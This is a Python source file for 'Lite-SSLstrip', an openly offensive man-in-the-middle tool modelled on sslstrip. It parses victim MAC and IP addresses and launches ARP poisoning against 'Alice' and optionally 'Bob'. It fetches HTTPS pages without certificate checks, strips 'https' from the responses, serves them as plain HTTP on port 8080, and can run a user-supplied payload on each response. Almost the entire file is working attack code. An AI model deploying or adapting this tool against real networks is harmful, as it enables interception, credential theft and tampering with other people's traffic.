"""
Lite-SSLstrip is a lightweight variation on the sslstrip tool by M0xie Marlinspike: https://github.com/moxie0/sslstrip
which can be executed with a commandline.
It is based on the well documented and lightweight http server CherryPy and the Requests modules for python
Lite-SSLstrip is extendable with you own payloads, if that is what your thing.

This script is the main control of the Lite-SSLSTRIP tool, it:
- reads user input, including commandline options
- launches the ARP-poisoning attack on Alice (and Bob)
- establishes https connection to Bob
- strips any https content from request
- returns stripped response """

import argparse
import cherrypy
import random
import string
import requests
from arppoison import ArpPoison
from init import init

init()

# Retreive commandline arguments for ARP-spoofing
parser = argparse.ArgumentParser()
parser.add_argument('macA', help="MAC address of Alice")
parser.add_argument('ipA', help="IP address of Alice")
parser.add_argument('macB', help="MAC address of Bob")
parser.add_argument('ipB', help="IP address of Bob")
parser.add_argument('macM', help="MAC address of you (Mallory)")
parser.add_argument('ipM', help="IP address of you (Mallory)")
parser.add_argument("-sb", "--spoof_bob", help="Spoof the address of Alice to Bob", action="store_true")
parser.add_argument("-p", "--payload",
                    help="Link to own attack module returning a requests.Response object, default: null",
                    action="store_true")

args = parser.parse_args()

# Launch ARP attack
arp = ArpPoison(args.macA, args.ipA, args.macB, args.ipB, args.macM, args.ipM)
arp.arpPoisonA()

# Spoof bob if that is what we want to do
if (args.spoof_bob):
    arp.arpPoisonB()

# Strips all https content out of a https request, creating a beleivable http response
def fromHTTPStoHTTP(r, url):
    # Create a new response
    response = requests.models.Response()

    # Set HTTPstatuscode to 200 OK
    response.status_code = 200

    # Set the response url to the url provided
    response.url = url

    # Strip the body
    newBody = str(r.text).replace("HTTPS", "HTTP")
    newBody = str(newBody).replace("https", "http")

    response._content = newBody.encode('utf-8')

    # Copy all the rest
    response.headers = r.headers
    response.history = r.history
    response.encoding = r.encoding
    response.reason = r.reason
    response.elapsed = r.elapsed
    response.request = r.request

    print "HTTPS was stripped"

    return response

class SSLStrip(object):
    # actual method that does the ssl stripping
    @cherrypy.expose
    def default(self, *route):
        # Get the requested URL from cherrypy
        url = cherrypy.url()
        print "Request received for url: " + url

        # Insert https connection because we are connecting to a https server
        url = str(url).replace("http", "https")

        # Retrieve data from Bob
        r = requests.get(url, verify=False)

        # Log status code and encoding
        print "Request made and returned status code: " +  str(r.status_code)
        print "Response encoding: " + str(r.encoding)

        # If this is not text, then just return the content
        if(str(r.encoding) == "None"):
            return r.content

        # Otherwise, we have text and we need to filter https content
        response = fromHTTPStoHTTP(r, url)

        # Additional payloads can be loaded from an external script, runs the payload() function
        if (args.payload != False):
            print "Own payload loaded from" + str(args.payload)
            import payload
            response = payload.payload(response)

        # Return the (now http) response
        return response.content

# Starting the server
if __name__ == '__main__':
    # This command binds cherrypy to all interfaces of this machine, hence it is findable on the network on port 8080
    cherrypy.config.update({'server.socket_host': '0.0.0.0'})
    # This command actually starts the server
    cherrypy.quickstart(SSLStrip())

